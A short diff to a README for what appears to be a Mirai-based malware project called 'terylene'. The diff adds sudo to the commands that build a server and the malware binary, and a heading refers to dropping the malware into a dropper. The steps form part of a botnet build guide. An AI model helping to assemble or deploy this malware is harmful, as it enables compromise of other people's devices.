@@ -112,10 +112,10 @@ cd ..
 
 ```
 cd server
-go build server.go
+sudo go build server.go
 cd ..
 cd mirai
-go build -ldflags="-s -w" terylene.go
+sudo go build -ldflags="-s -w" terylene.go
 ```
 
 ### drop the terylene malware into the dropper
